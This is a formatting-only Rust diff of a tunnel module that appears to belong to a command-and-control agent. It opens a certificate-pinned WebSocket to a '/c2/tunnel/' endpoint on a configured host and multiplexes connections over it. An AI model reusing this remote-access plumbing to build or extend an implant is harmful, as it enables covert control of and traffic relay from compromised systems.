@@ -30,7 +30,11 @@ fn enc(cmd: u8, conn_id: u32, payload: &[u8]) -> Vec<u8> {
 
 fn dec(data: &[u8]) -> Result<(u8, u32, &[u8])> {
     anyhow::ensure!(data.len() >= 5, "frame too short");
-    Ok((data[0], u32::from_be_bytes(data[1..5].try_into().unwrap()), &data[5..]))
+    Ok((
+        data[0],
+        u32::from_be_bytes(data[1..5].try_into().unwrap()),
+        &data[5..],
+    ))
 }
 
 type ConnMap = Arc<Mutex<HashMap<u32, mpsc::Sender<Vec<u8>>>>>;
@@ -40,18 +44,19 @@ pub async fn run_tunnel(config: &Config, tunnel_type: &str, session_id: &str) ->
         "wss://{}:{}/c2/tunnel/{}/{}",
         config.host, config.port, tunnel_type, session_id
     );
-    let verifier = Arc::new(PinnedCertVerifier { expected_hash: config.cert_hash });
+    let verifier = Arc::new(PinnedCertVerifier {
+        expected_hash: config.cert_hash,
+    });
     let rustls_cfg = Arc::new(
         rustls::ClientConfig::builder_with_protocol_versions(&[&rustls::version::TLS13])
             .dangerous()
             .with_custom_certificate_verifier(verifier)
             .with_no_client_auth(),
     );
-    let (ws, _) = connect_async_tls_with_config(
-        &url, None, false, Some(Connector::Rustls(rustls_cfg)),
-    )
-    .await
-    .map_err(|e| anyhow::anyhow!("WS connect: {e}"))?;
+    let (ws, _) =
+        connect_async_tls_with_config(&url, None, false, Some(Connector::Rustls(rustls_cfg)))
+            .await
+            .map_err(|e| anyhow::anyhow!("WS connect: {e}"))?;
 
     let (ws_sink, ws_stream) = ws.split();
     let conn_map: ConnMap = Arc::new(Mutex::new(HashMap::new()));
